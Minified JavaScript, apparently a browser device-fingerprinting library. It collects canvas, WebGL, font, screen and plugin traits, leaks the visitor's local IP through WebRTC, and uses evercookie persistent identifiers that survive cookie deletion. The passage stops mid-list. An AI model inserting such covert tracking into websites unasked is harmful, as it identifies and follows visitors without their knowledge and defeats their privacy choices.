function G() {
    return function () {
    }
}

(function () {
    function Pa() {
        if (-1 == F("BSFIT_EXPIRATION")) for (var a = 0; 10 > a; a++) setTimeout(function () {
            (new ga).getFingerPrint()
        }, 20 + 2E3 * Math.pow(a, 2)); else (new ga).getFingerPrint();
        setTimeout(function () {
            window.setInterval(function () {
                (new ga).getFingerPrint()
            }, 3E5)
        }, 3E5)
    }

    function mb(a) {
        this.isTimeout = 0;
        var b = this, c = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
        if ("function" == typeof c) {
            try {
                var d = new c({iceServers: []});
                d.createDataChannel("", {reliable: !1})
            } catch (f) {
                if (2 !=
                    b.isTimeout) {
                    b.isTimeout = 1;
                    a();
                    return
                }
            }
            var e = !1;
            d.onicecandidate = function (c) {
                var d = /([0-9]{1,3}(\.[0-9]{1,3}){3})/, f = [];
                "complete" != c.target.iceGatheringState || e || (e = !0, c.target.localDescription.sdp.split("\n").forEach(function (a) {
                    (a = d.exec(a)) && "127.0.0.1" != a[1] && "0.0.0.0" != a[1] && -1 === f.indexOf(a[1]) && f.push(a[1])
                }), 2 != b.isTimeout && (b.isTimeout = 1, a({localAddr: 0 < f.length ? f.sort()[0] : ""})))
            };
            d.onaddstream = function (a) {
                remoteVideo.src = window.URL.createObjectURL(a.stream)
            };
            d.createOffer(function (a) {
                d.setLocalDescription(a,
                    G(), G())
            }, G(), {})
        } else a();
        setTimeout(function () {
            0 == b.isTimeout && (b.isTimeout = 2, a())
        }, 500)
    }

    function xa(a) {
        var b = a.length;
        return 0 == a.length % 2 ? a.substring(b / 2, b) + a.substring(0, b / 2) : a.substring(b / 2 + 1, b) + a.charAt(b / 2) + a.substring(0, b / 2)
    }

    function Qa(a) {
        return null != /[\\\"<>\.;]/.exec(a) && "undefined" != typeof encodeURIComponent ? encodeURIComponent(a) : a
    }

    function O(a, b) {
        if (Ra) {
            var c = b ? "visible" : "hidden";
            P && J(a) ? J(a).style.visibility = c : Sa("#" + a, "visibility:" + c)
        }
    }

    function Sa(a, b, c, d) {
        if (!l.ie || !l.mac) {
            var e =
                p.getElementsByTagName("head")[0];
            e && (c = c && "string" == typeof c ? c : "screen", d && (ya = L = null), L && ya == c || (d = p.createElement("style"), d.setAttribute("type", "text/css"), d.setAttribute("media", c), L = e.appendChild(d), l.ie && l.win && "undefined" != typeof p.styleSheets && 0 < p.styleSheets.length && (L = p.styleSheets[p.styleSheets.length - 1]), ya = c), l.ie && l.win ? L && "object" == typeof L.addRule && L.addRule(a, b) : L && "undefined" != typeof p.createTextNode && L.appendChild(p.createTextNode(a + " {" + b + "}")))
        }
    }

    function ha(a) {
        var b = l.pv;
        a = a.split(".");
        a[0] = parseInt(a[0], 10);
        a[1] = parseInt(a[1], 10) || 0;
        a[2] = parseInt(a[2], 10) || 0;
        return b[0] > a[0] || b[0] == a[0] && b[1] > a[1] || b[0] == a[0] && b[1] == a[1] && b[2] >= a[2] ? !0 : !1
    }

    function J(a) {
        var b = null;
        try {
            b = p.getElementById(a)
        } catch (c) {
        }
        return b
    }

    function Ta(a) {
        var b = J(a);
        b && "OBJECT" == b.nodeName && (l.ie && l.win ? (b.style.display = "none", function d() {
            if (4 == b.readyState) {
                var e = J(a);
                if (e) {
                    for (var f in e) "function" == typeof e[f] && (e[f] = null);
                    e.parentNode.removeChild(e)
                }
            } else setTimeout(d, 10)
        }()) : b.parentNode.removeChild(b))
    }

    function za(a, b, c) {
        var d, e = J(c);
        if (l.wk && 312 > l.wk) return d;
        if (e) if ("undefined" == typeof a.id && (a.id = c), l.ie && l.win) {
            var f = "", g;
            for (g in a) a[g] != Object.prototype[g] && ("data" == g.toLowerCase() ? b.movie = a[g] : "styleclass" == g.toLowerCase() ? f += ' class\x3d"' + a[g] + '"' : "classid" != g.toLowerCase() && (f += " " + g + '\x3d"' + a[g] + '"'));
            g = "";
            for (var h in b) b[h] != Object.prototype[h] && (g += '\x3cparam name\x3d"' + h + '" value\x3d"' + b[h] + '" /\x3e');
            e.outerHTML = '\x3cobject classid\x3d"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"' +
                f + "\x3e" + g + "\x3c/object\x3e";
            ia[ia.length] = a.id;
            d = J(a.id)
        } else {
            h = p.createElement("object");
            h.setAttribute("type", "application/x-shockwave-flash");
            for (var w in a) a[w] != Object.prototype[w] && ("styleclass" == w.toLowerCase() ? h.setAttribute("class", a[w]) : "classid" != w.toLowerCase() && h.setAttribute(w, a[w]));
            for (f in b) b[f] != Object.prototype[f] && "movie" != f.toLowerCase() && (a = h, g = f, w = b[f], c = p.createElement("param"), c.setAttribute("name", g), c.setAttribute("value", w), a.appendChild(c));
            e.parentNode.replaceChild(h,
                e);
            d = h
        }
        return d
    }

    function Aa(a) {
        var b = p.createElement("div");
        if (l.win && l.ie) b.innerHTML = a.innerHTML; else if (a = a.getElementsByTagName("object")[0]) if (a = a.childNodes) for (var c = a.length, d = 0; d < c; d++) 1 == a[d].nodeType && "PARAM" == a[d].nodeName || 8 == a[d].nodeType || b.appendChild(a[d].cloneNode(!0));
        return b
    }

    function nb(a) {
        if (l.ie && l.win && 4 != a.readyState) {
            var b = p.createElement("div");
            a.parentNode.insertBefore(b, a);
            b.parentNode.replaceChild(Aa(a), b);
            a.style.display = "none";
            (function d() {
                4 == a.readyState ? a.parentNode.removeChild(a) :
                    setTimeout(d, 10)
            })()
        } else a.parentNode.replaceChild(Aa(a), a)
    }

    function Ba(a, b, c, d) {
        ja = !0;
        Ca = d || null;
        Ua = {success: !1, id: c};
        var e = J(c);
        if (e) {
            "OBJECT" == e.nodeName ? (X = Aa(e), ka = null) : (X = e, ka = c);
            a.id = "SWFObjectExprInst";
            if ("undefined" == typeof a.width || !/%$/.test(a.width) && 310 > parseInt(a.width, 10)) a.width = "310";
            if ("undefined" == typeof a.height || !/%$/.test(a.height) && 137 > parseInt(a.height, 10)) a.height = "137";
            p.title = p.title.slice(0, 47) + " - Flash Player Installation";
            d = l.ie && l.win ? "ActiveX" : "PlugIn";
            d = "MMredirectURL\x3d" +
                I.location.toString().replace(/&/g, "%26") + "\x26MMplayerType\x3d" + d + "\x26MMdoctitle\x3d" + p.title;
            b.flashvars = "undefined" != typeof b.flashvars ? b.flashvars + ("\x26" + d) : d;
            l.ie && l.win && 4 != e.readyState && (d = p.createElement("div"), c += "SWFObjectNew", d.setAttribute("id", c), e.parentNode.insertBefore(d, e), e.style.display = "none", function g() {
                4 == e.readyState ? e.parentNode.removeChild(e) : setTimeout(g, 10)
            }());
            za(a, b, c)
        }
    }

    function Da() {
        return !ja && ha("6.0.65") && (l.win || l.mac) && !(l.wk && 312 > l.wk)
    }

    function Ea(a) {
        var b = null;
        (a = J(a)) && "OBJECT" == a.nodeName && ("undefined" != typeof a.SetVariable ? b = a : (a = a.getElementsByTagName("object")[0]) && (b = a));
        return b
    }

    function Fa() {
        var a = M.length;
        if (0 < a) for (var b = 0; b < a; b++) {
            var c = M[b].id, d = M[b].callbackFn, e = {success: !1, id: c};
            if (0 < l.pv[0]) {
                var f = J(c);
                if (f) if (!ha(M[b].swfVersion) || l.wk && 312 > l.wk) if (M[b].expressInstall && Da()) {
                    e = {};
                    e.data = M[b].expressInstall;
                    e.width = f.getAttribute("width") || "0";
                    e.height = f.getAttribute("height") || "0";
                    f.getAttribute("class") && (e.styleclass = f.getAttribute("class"));
                    f.getAttribute("align") && (e.align = f.getAttribute("align"));
                    for (var g = {}, f = f.getElementsByTagName("param"), h = f.length, w = 0; w < h; w++) "movie" != f[w].getAttribute("name").toLowerCase() && (g[f[w].getAttribute("name")] = f[w].getAttribute("value"));
                    Ba(e, g, c, d)
                } else nb(f), d && d(e); else O(c, !0), d && (e.success = !0, e.ref = Ea(c), d(e))
            } else O(c, !0), d && ((c = Ea(c)) && "undefined" != typeof c.SetVariable && (e.success = !0, e.ref = c), d(e))
        }
    }

    function Va(a) {
        if ("undefined" != typeof I.addEventListener) I.addEventListener("load", a, !1); else if ("undefined" !=
            typeof p.addEventListener) p.addEventListener("load", a, !1); else if ("undefined" != typeof I.attachEvent) {
            var b = I;
            b.attachEvent("onload", a);
            T[T.length] = [b, "onload", a]
        } else if ("function" == typeof I.onload) {
            var c = I.onload;
            I.onload = function () {
                c();
                a()
            }
        } else I.onload = a
    }

    function Wa(a) {
        P ? a() : la[la.length] = a
    }

    function U() {
        if (!P) {
            try {
                var a = p.getElementsByTagName("body")[0].appendChild(p.createElement("span"));
                a.parentNode.removeChild(a)
            } catch (c) {
                return
            }
            P = !0;
            for (var a = la.length, b = 0; b < a; b++) la[b]()
        }
    }

    function Ga(a) {
        if (!a) return "";
        if (ob(a)) return a.replace(/\s/g, "");
        -1 != a.indexOf("://") && (a = a.substr(a.indexOf("://") + 3));
        var b = "com net org gov edu mil biz name info mobi pro travel museum int areo post rec".split(" "),
            c = a.split(".");
        if (1 >= c.length || !isNaN(c[c.length - 1])) return a;
        for (a = 0; a < b.length && b[a] != c[c.length - 1];) a++;
        if (a != b.length) return "." + c[c.length - 2] + "." + c[c.length - 1];
        for (a = 0; a < b.length && b[a] != c[c.length - 2];) a++;
        return a == b.length ? c[c.length - 2] + "." + c[c.length - 1] : "." + c[c.length - 3] + "." + c[c.length - 2] + "." + c[c.length - 1]
    }

    function Xa(a) {
        return 4294967296 * (a - (a | 0)) | 0
    }

    function pb(a) {
        var b = a.split(".");
        if (4 !== b.length) throw Error("Invalid format -- expecting a.b.c.d");
        for (var c = a = 0; c < b.length; ++c) {
            var d = parseInt(b[c], 10);
            if (Number.isNaN(d) || 0 > d || 255 < d) throw Error("Each octet must be between 0 and 255");
            a |= d << 8 * (b.length - c - 1);
            a >>>= 0
        }
        return a
    }

    function Y(a) {
        if (!(this instanceof Y)) return new Y(a);
        this.options = this.extend(a, {
            swfContainerId: "fingerprintjs2", swfPath: "flash/compiled/FontList.swf", detectScreenOrientation: !0,
            sortPluginsFor: [/palemoon/i], userDefinedFonts: []
        });
        this.nativeForEach = Array.prototype.forEach;
        this.nativeMap = Array.prototype.map
    }

    function Z(a) {
        for (var b = [], c = 0; c < 8 * a.length; c += 8) b[c >> 5] |= (a.charCodeAt(c / 8) & 255) << c % 32;
        a = 8 * a.length;
        b[a >> 5] |= 128 << a % 32;
        b[(a + 64 >>> 9 << 4) + 14] = a;
        a = 1732584193;
        for (var c = -271733879, d = -1732584194, e = 271733878, f = 0; f < b.length; f += 16) {
            var g = a, h = c, w = d, l = e;
            a = x(a, c, d, e, b[f + 0], 7, -680876936);
            e = x(e, a, c, d, b[f + 1], 12, -389564586);
            d = x(d, e, a, c, b[f + 2], 17, 606105819);
            c = x(c, d, e, a, b[f + 3], 22, -1044525330);
            a = x(a, c, d, e, b[f + 4], 7, -176418897);
            e = x(e, a, c, d, b[f + 5], 12, 1200080426);
            d = x(d, e, a, c, b[f + 6], 17, -1473231341);
            c = x(c, d, e, a, b[f + 7], 22, -45705983);
            a = x(a, c, d, e, b[f + 8], 7, 1770035416);
            e = x(e, a, c, d, b[f + 9], 12, -1958414417);
            d = x(d, e, a, c, b[f + 10], 17, -42063);
            c = x(c, d, e, a, b[f + 11], 22, -1990404162);
            a = x(a, c, d, e, b[f + 12], 7, 1804603682);
            e = x(e, a, c, d, b[f + 13], 12, -40341101);
            d = x(d, e, a, c, b[f + 14], 17, -1502002290);
            c = x(c, d, e, a, b[f + 15], 22, 1236535329);
            a = C(a, c, d, e, b[f + 1], 5, -165796510);
            e = C(e, a, c, d, b[f + 6], 9, -1069501632);
            d = C(d, e, a, c, b[f + 11], 14, 643717713);
            c = C(c, d, e, a, b[f + 0], 20, -373897302);
            a = C(a, c, d, e, b[f + 5], 5, -701558691);
            e = C(e, a, c, d, b[f + 10], 9, 38016083);
            d = C(d, e, a, c, b[f + 15], 14, -660478335);
            c = C(c, d, e, a, b[f + 4], 20, -405537848);
            a = C(a, c, d, e, b[f + 9], 5, 568446438);
            e = C(e, a, c, d, b[f + 14], 9, -1019803690);
            d = C(d, e, a, c, b[f + 3], 14, -187363961);
            c = C(c, d, e, a, b[f + 8], 20, 1163531501);
            a = C(a, c, d, e, b[f + 13], 5, -1444681467);
            e = C(e, a, c, d, b[f + 2], 9, -51403784);
            d = C(d, e, a, c, b[f + 7], 14, 1735328473);
            c = C(c, d, e, a, b[f + 12], 20, -1926607734);
            a = D(a, c, d, e, b[f + 5], 4, -378558);
            e = D(e, a, c, d, b[f + 8], 11, -2022574463);
            d = D(d, e, a, c, b[f + 11], 16, 1839030562);
            c = D(c, d, e, a, b[f + 14], 23, -35309556);
            a = D(a, c, d, e, b[f + 1], 4, -1530992060);
            e = D(e, a, c, d, b[f + 4], 11, 1272893353);
            d = D(d, e, a, c, b[f + 7], 16, -155497632);
            c = D(c, d, e, a, b[f + 10], 23, -1094730640);
            a = D(a, c, d, e, b[f + 13], 4, 681279174);
            e = D(e, a, c, d, b[f + 0], 11, -358537222);
            d = D(d, e, a, c, b[f + 3], 16, -722521979);
            c = D(c, d, e, a, b[f + 6], 23, 76029189);
            a = D(a, c, d, e, b[f + 9], 4, -640364487);
            e = D(e, a, c, d, b[f + 12], 11, -421815835);
            d = D(d, e, a, c, b[f + 15], 16, 530742520);
            c = D(c, d, e, a, b[f + 2], 23, -995338651);
            a = E(a, c, d, e, b[f + 0], 6, -198630844);
            e = E(e, a, c, d, b[f + 7], 10, 1126891415);
            d = E(d, e, a, c, b[f + 14], 15, -1416354905);
            c = E(c, d, e, a, b[f + 5], 21, -57434055);
            a = E(a, c, d, e, b[f + 12], 6, 1700485571);
            e = E(e, a, c, d, b[f + 3], 10, -1894986606);
            d = E(d, e, a, c, b[f + 10], 15, -1051523);
            c = E(c, d, e, a, b[f + 1], 21, -2054922799);
            a = E(a, c, d, e, b[f + 8], 6, 1873313359);
            e = E(e, a, c, d, b[f + 15], 10, -30611744);
            d = E(d, e, a, c, b[f + 6], 15, -1560198380);
            c = E(c, d, e, a, b[f + 13], 21, 1309151649);
            a = E(a, c, d, e, b[f + 4], 6, -145523070);
            e = E(e, a, c, d, b[f + 11], 10, -1120210379);
            d = E(d, e, a, c, b[f + 2], 15, 718787259);
            c = E(c, d, e, a, b[f + 9], 21,
                -343485551);
            a = y(a, g);
            c = y(c, h);
            d = y(d, w);
            e = y(e, l)
        }
        b = [a, c, d, e];
        a = "";
        for (c = 0; c < 4 * b.length; c++) a += "0123456789abcdef".charAt(b[c >> 2] >> c % 4 * 8 + 4 & 15) + "0123456789abcdef".charAt(b[c >> 2] >> c % 4 * 8 & 15);
        return a
    }

    function x(a, b, c, d, e, f, g) {
        return y(ma(y(y(a, b & c | ~b & d), y(e, g)), f), b)
    }

    function C(a, b, c, d, e, f, g) {
        return y(ma(y(y(a, b & d | c & ~d), y(e, g)), f), b)
    }

    function D(a, b, c, d, e, f, g) {
        return y(ma(y(y(a, b ^ c ^ d), y(e, g)), f), b)
    }

    function E(a, b, c, d, e, f, g) {
        return y(ma(y(y(a, c ^ (b | ~d)), y(e, g)), f), b)
    }

    function y(a, b) {
        var c = (a & 65535) + (b & 65535);
        return (a >> 16) + (b >> 16) + (c >> 16) << 16 | c & 65535
    }

    function ma(a, b) {
        return a << b | a >>> 32 - b
    }

    function F(a) {
        var b, c, d, e = document.cookie.split(";");
        for (b = 0; b < e.length; b++) if (c = e[b].substr(0, e[b].indexOf("\x3d")), d = e[b].substr(e[b].indexOf("\x3d") + 1), c = c.replace(/^\s+|\s+$/g, ""), a = a.replace(/^\s+|\s+$/g, ""), c == a) return unescape(d)
    }

    function na(a, b, c, d, e, f) {
        var g = new Date;
        g.setTime(g.getTime());
        -1 != c ? (c *= 864E5, g = new Date(g.getTime() + c), cookieString = a + "\x3d" + escape(b) + (c ? ";expires\x3d" + g.toGMTString() : "") + (d ? ";path\x3d" +
            d : "") + (e ? ";domain\x3d" + e : "") + (f ? ";secure" : "")) : (g = -1, cookieString = a + "\x3d" + escape(b) + (c ? ";expires\x3d" + g : "") + (d ? ";path\x3d" + d : "") + (e ? ";domain\x3d" + e : "") + (f ? ";secure" : ""));
        document.cookie = cookieString
    }

    function ob(a) {
        a = a.replace(/\s/g, "");
        if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(a)) {
            a = a.split(".");
            if (0 == parseInt(parseFloat(a[0])) || 0 == parseInt(parseFloat(a[3]))) return !1;
            for (var b = 0; b < a.length; b++) if (255 < parseInt(parseFloat(a[b]))) return !1;
            return !0
        }
        return !1
    }

    function n(a, b) {
        this.key = a;
        this.value =
            b
    }

    function na(a, b, c) {
        var d = new Date;
        d.setTime(d.getTime() + 864E5 * Number(c));
        document.cookie = a + "\x3d" + b + "; path\x3d/;expires \x3d " + d.toGMTString() + ";domain\x3d" + Ga(window.location.host.split(":")[0])
    }

    function Ha() {
        var a = navigator.userAgent.toLowerCase();
        return 0 <= a.indexOf("windows phone") ? "WindowsPhone" : 0 <= a.indexOf("win") ? "Windows" : 0 <= a.indexOf("android") ? "Android" : 0 <= a.indexOf("linux") ? "Linux" : 0 <= a.indexOf("iphone") || 0 <= a.indexOf("ipad") ? "iOS" : 0 <= a.indexOf("mac") ? "Mac" : "Other"
    }

    function ga() {
        this.ec =
            new evercookie;
        this.deviceEc = new evercookie;
        this.cfp = new Y;
        this.packageString = "";
        this.moreInfoArray = []
    }

    var Ya = ["WEB", "WAP"], Za = {
        now: function () {
            return (new Date).getTime()
        }, rand: function () {
            return Math.random().toString().substr(2)
        }, removeElem: function (a) {
            var b = a.parentNode;
            if (b) try {
                b.removeChild(a)
            } catch (c) {
            }
        }, parseData: function (a) {
            var b = "";
            if ("string" === typeof a) b = a; else if ("object" === typeof a) for (var c in a) b += "\x26" + c + "\x3d" + encodeURIComponent(a[c]);
            b += "\x26_time\x3d" + this.now();
            return b = b.substr(1)
        },
        getJSON: function (a, b, c) {
            b = document.createElement("script");
            b.type = "text/javascript";
            b.src = a;
            b.id = "id_callbackFunction";
            window.callbackFunction = function (a) {
                window.callbackFunction = void 0;
                var b = document.getElementById("id_callbackFunction");
                b && Za.removeElem(b);
                c(a)
            };
            (a = document.getElementsByTagName("head")) && a[0] && a[0].appendChild(b)
        }
    };
    "object" != typeof JSON && (JSON = {});
    (function () {
        function a(a) {
            return 10 > a ? "0" + a : a
        }

        function b() {
            return this.valueOf()
        }

        function c(a) {
            return v.lastIndex = 0, v.test(a) ? '"' + a.replace(v,
                function (a) {
                    var b = g[a];
                    return "string" == typeof b ? b : "\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4)
                }) + '"' : '"' + a + '"'
        }

        function d(a, b) {
            var q, g, z, A, K, m = e, k = b[a];
            switch (k && "object" == typeof k && "function" == typeof k.toJSON && (k = k.toJSON(a)), "function" == typeof h && (k = h.call(b, a, k)), typeof k) {
                case "string":
                    return c(k);
                case "number":
                    return isFinite(k) ? String(k) : "null";
                case "boolean":
                case "null":
                    return String(k);
                case "object":
                    if (!k) return "null";
                    if (e += f, K = [], "[object Array]" === Object.prototype.toString.apply(k)) {
                        A =
                            k.length;
                        for (q = 0; A > q; q += 1) K[q] = d(q, k) || "null";
                        return z = 0 === K.length ? "[]" : e ? "[\n" + e + K.join(",\n" + e) + "\n" + m + "]" : "[" + K.join(",") + "]", e = m, z
                    }
                    if (h && "object" == typeof h) for (A = h.length, q = 0; A > q; q += 1) "string" == typeof h[q] && (g = h[q], z = d(g, k), z && K.push(c(g) + (e ? ": " : ":") + z)); else for (g in k) Object.prototype.hasOwnProperty.call(k, g) && (z = d(g, k), z && K.push(c(g) + (e ? ": " : ":") + z));
                    return z = 0 === K.length ? "{}" : e ? "{\n" + e + K.join(",\n" + e) + "\n" + m + "}" : "{" + K.join(",") + "}", e = m, z
            }
        }

        var e, f, g, h, w = /^[\],:{}\s]*$/, l = /\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,
            k = /"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, m = /(?:^|:|,)(?:\s*\[)+/g,
            v = /[\\\"\u0000-\u001f\u007f-\u009f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
            u = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;
        "function" != typeof Date.prototype.toJSON && (Date.prototype.toJSON = function () {
            return isFinite(this.valueOf()) ? this.getUTCFullYear() + "-" + a(this.getUTCMonth() + 1) + "-" + a(this.getUTCDate()) +
                "T" + a(this.getUTCHours()) + ":" + a(this.getUTCMinutes()) + ":" + a(this.getUTCSeconds()) + "Z" : null
        }, Boolean.prototype.toJSON = b, Number.prototype.toJSON = b, String.prototype.toJSON = b);
        "function" != typeof JSON.stringify && (g = {
            "\b": "\\b",
            "\t": "\\t",
            "\n": "\\n",
            "\f": "\\f",
            "\r": "\\r",
            '"': '\\"',
            "\\": "\\\\"
        }, JSON.stringify = function (a, b, c) {
            var q;
            if (e = "", f = "", "number" == typeof c) for (q = 0; c > q; q += 1) f += " "; else "string" == typeof c && (f = c);
            if (h = b, b && "function" != typeof b && ("object" != typeof b || "number" != typeof b.length)) throw Error("JSON.stringify");
            return d("", {"": a})
        });
        "function" != typeof JSON.parse && (JSON.parse = function (a, b) {
            function c(a, e) {
                var d, f, q = a[e];
                if (q && "object" == typeof q) for (d in q) Object.prototype.hasOwnProperty.call(q, d) && (f = c(q, d), void 0 !== f ? q[d] = f : delete q[d]);
                return b.call(a, e, q)
            }

            var e;
            if (a = String(a), u.lastIndex = 0, u.test(a) && (a = a.replace(u, function (a) {
                return "\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4)
            })), w.test(a.replace(l, "@").replace(k, "]").replace(m, ""))) return e = eval("(" + a + ")"), "function" == typeof b ? c({"": e}, "") : e;
            throw new SyntaxError("JSON.parse");
        })
    })();
    Array.prototype.indexOf || (Array.prototype.indexOf = function (a, b) {
        var c;
        if (null == this) throw new TypeError("'this' is null or undefined");
        var d = Object(this), e = d.length >>> 0;
        if (0 === e) return -1;
        c = +b || 0;
        Infinity === Math.abs(c) && (c = 0);
        if (c >= e) return -1;
        for (c = Math.max(0 <= c ? c : e - Math.abs(c), 0); c < e;) {
            if (c in d && d[c] === a) return c;
            c++
        }
        return -1
    });
    Y.prototype = {
        extend: function (a, b) {
            if (null == a) return b;
            for (var c in a) null != a[c] && b[c] !== a[c] && (b[c] = a[c]);
            return b
        }, get: function (a) {
            var b =
                    [], b = this.userAgentKey(b), b = this.languageKey(b), b = this.colorDepthKey(b),
                b = this.pixelRatioKey(b), b = this.screenResolutionKey(b), b = this.availableScreenResolutionKey(b),
                b = this.timezoneOffsetKey(b), b = this.sessionStorageKey(b), b = this.localStorageKey(b),
                b = this.indexedDbKey(b), b = this.addBehaviorKey(b), b = this.openDatabaseKey(b),
                b = this.cpuClassKey(b), b = this.platformKey(b), b = this.doNotTrackKey(b), b = this.pluginsKey(b),
                b = this.canvasKey(b), b = this.webglKey(b), b = this.adBlockKey(b), b = this.hasLiedLanguagesKey(b),
                b =
                    this.hasLiedResolutionKey(b), b = this.hasLiedOsKey(b), b = this.hasLiedBrowserKey(b),
                b = this.touchSupportKey(b), c = this;
            this.fontsKey(b, function (b) {
                var e = [];
                c.each(b, function (a) {
                    var b = a.value;
                    "undefined" !== typeof a.value.join && (b = a.value.join(";"));
                    e.push(b)
                });
                var d = c.x64hash128(e.join("~~~"), 31);
                return a(d, b)
            })
        }, userAgentKey: function (a) {
            this.options.excludeUserAgent || a.push({key: "user_agent", value: this.getUserAgent()});
            return a
        }, getUserAgent: function () {
            var a = navigator.userAgent;
            return a = a.replace(/\&|\+|\?|\%|\#|\/|\=/g,
                "")
        }, languageKey: function (a) {
            this.options.excludeLanguage || a.push({
                key: "language",
                value: navigator.language || navigator.userLanguage || navigator.browserLanguage || navigator.systemLanguage || ""
            });
            return a
        }, colorDepthKey: function (a) {
            this.options.excludeColorDepth || a.push({key: "color_depth", value: screen.colorDepth || -1});
            return a
        }, pixelRatioKey: function (a) {
            this.options.excludePixelRatio || a.push({key: "pixel_ratio", value: this.getPixelRatio()});
            return a
        }, getPixelRatio: function () {
            return window.devicePixelRatio ||
                ""
        }, screenResolutionKey: function (a) {
            return this.options.excludeScreenResolution ? a : this.getScreenResolution(a)
        }, getScreenResolution: function (a) {
            var b;
            b = this.options.detectScreenOrientation ? screen.height > screen.width ? [screen.height, screen.width] : [screen.width, screen.height] : [screen.width, screen.height];
            "undefined" !== typeof b && a.push({key: "resolution", value: b});
            return a
        }, availableScreenResolutionKey: function (a) {
            return this.options.excludeAvailableScreenResolution ? a : this.getAvailableScreenResolution(a)
        },
        getAvailableScreenResolution: function (a) {
            var b;
            screen.availWidth && screen.availHeight && (b = this.options.detectScreenOrientation ? screen.availHeight > screen.availWidth ? [screen.availHeight, screen.availWidth] : [screen.availWidth, screen.availHeight] : [screen.availHeight, screen.availWidth]);
            "undefined" !== typeof b && a.push({key: "available_resolution", value: b});
            return a
        }, timezoneOffsetKey: function (a) {
            this.options.excludeTimezoneOffset || a.push({
                key: "timezone_offset",
                value: (new Date).getTimezoneOffset()
            });
            return a
        },
        sessionStorageKey: function (a) {
            !this.options.excludeSessionStorage && this.hasSessionStorage() && a.push({
                key: "session_storage",
                value: 1
            });
            return a
        }, localStorageKey: function (a) {
            !this.options.excludeSessionStorage && this.hasLocalStorage() && a.push({key: "local_storage", value: 1});
            return a
        }, indexedDbKey: function (a) {
            !this.options.excludeIndexedDB && this.hasIndexedDB() && a.push({key: "indexed_db", value: 1});
            return a
        }, addBehaviorKey: function (a) {
            document.body && !this.options.excludeAddBehavior && document.body.addBehavior &&
            a.push({key: "add_behavior", value: 1});
            return a
        }, openDatabaseKey: function (a) {
            !this.options.excludeOpenDatabase && window.openDatabase && a.push({key: "open_database", value: 1});
            return a
        }, cpuClassKey: function (a) {
            this.options.excludeCpuClass || a.push({key: "cpu_class", value: this.getNavigatorCpuClass()});
            return a
        }, platformKey: function (a) {
            this.options.excludePlatform || a.push({key: "navigator_platform", value: this.getNavigatorPlatform()});
            return a
        }, doNotTrackKey: function (a) {
            this.options.excludeDoNotTrack || a.push({
                key: "do_not_track",
                value: this.getDoNotTrack()
            });
            return a
        }, canvasKey: function (a) {
            !this.options.excludeCanvas && this.isCanvasSupported() && a.push({
                key: "canvas",
                value: this.getCanvasFp()
            });
            return a
        }, webglKey: function (a) {
            if (this.options.excludeWebGL || !this.isWebGlSupported()) return a;
            a.push({key: "webgl", value: this.getWebglFp()});
            return a
        }, adBlockKey: function (a) {
            this.options.excludeAdBlock || a.push({key: "adblock", value: this.getAdBlock()});
            return a
        }, hasLiedLanguagesKey: function (a) {
            this.options.excludeHasLiedLanguages || a.push({
                key: "has_lied_languages",
                value: this.getHasLiedLanguages()
            });
            return a
        }, hasLiedResolutionKey: function (a) {
            this.options.excludeHasLiedResolution || a.push({
                key: "has_lied_resolution",
                value: this.getHasLiedResolution()
            });
            return a
        }, hasLiedOsKey: function (a) {
            this.options.excludeHasLiedOs || a.push({key: "has_lied_os", value: this.getHasLiedOs()});
            return a
        }, hasLiedBrowserKey: function (a) {
            this.options.excludeHasLiedBrowser || a.push({key: "has_lied_browser", value: this.getHasLiedBrowser()});
            return a
        }, fontsKey: function (a, b) {
            return this.options.excludeJsFonts ?
                this.flashFontsKey(a, b) : this.jsFontsKey(a, b)
        }, flashFontsKey: function (a, b) {
            if (this.options.excludeFlashFonts || !this.hasSwfObjectLoaded() || !this.hasMinFlashInstalled() || "undefined" === typeof this.options.swfPath) return b(a);
            this.loadSwfAndDetectFonts(function (c) {
                a.push({key: "swf_fonts", value: c.join(";")});
                b(a)
            })
        }, jsFontsKey: function (a, b) {
            var c = this;
            return setTimeout(function () {
                function d() {
                    var a = document.createElement("span");
                    a.style.position = "absolute";
                    a.style.left = "-9999px";
                    a.style.fontSize = "72px";
                    a.style.lineHeight = "normal";
                    a.innerHTML = "mmmmmmmmmmlli";
                    return a
                }

                var e = ["monospace", "sans-serif", "serif"],
                    f = "Andale Mono;Arial;Arial Black;Arial Hebrew;Arial MT;Arial Narrow;Arial Rounded MT Bold;Arial Unicode MS;Bitstream Vera Sans Mono;Book Antiqua;Bookman Old Style;Calibri;Cambria;Cambria Math;Century;Century Gothic;Century Schoolbook;Comic Sans;Comic Sans MS;Consolas;Courier;Courier New;Garamond;Geneva;Georgia;Helvetica;Helvetica Neue;Impact;Lucida Bright;Lucida Calligraphy;Lucida Console;Lucida Fax;LUCIDA GRANDE;Lucida Handwriting;Lucida Sans;Lucida Sans Typewriter;Lucida Sans Unicode;Microsoft Sans Serif;Monaco;Monotype Corsiva;MS Gothic;MS Outlook;MS PGothic;MS Reference Sans Serif;MS Sans Serif;MS Serif;MYRIAD;MYRIAD PRO;Palatino;Palatino Linotype;Segoe Print;Segoe Script;Segoe UI;Segoe UI Light;Segoe UI Semibold;Segoe UI Symbol;Tahoma;Times;Times New Roman;Trebuchet MS;Verdana;Wingdings;Wingdings 2;Wingdings 3".split(";"),
